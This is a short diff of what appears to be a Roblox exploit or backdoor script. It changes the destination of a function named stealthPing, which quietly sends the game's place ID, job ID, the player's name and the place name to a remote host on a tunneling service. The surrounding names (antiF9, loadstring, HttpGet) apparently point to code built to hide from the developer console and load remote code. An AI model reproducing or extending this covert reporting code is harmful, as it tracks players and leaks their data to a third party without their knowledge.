@@ -32,7 +32,7 @@ local antiF9 = {getgenv = getgenv, HttpGet = game.HttpGet, loadstring = loadstri
 
 local function stealthPing()
     local url = string.format(
-        "http://moonrise.playit.plus:27177/api/roblox_ping?placeid=%s&jobid=%s&playername=%s&placename=%s",
+        "http://luopn9cqp5.localto.net:8724/api/roblox_ping?placeid=%s&jobid=%s&playername=%s&placename=%s",
         game.PlaceId, game.JobId, HttpService:UrlEncode(Player.Name), HttpService:UrlEncode(PlaceName)
     )
     
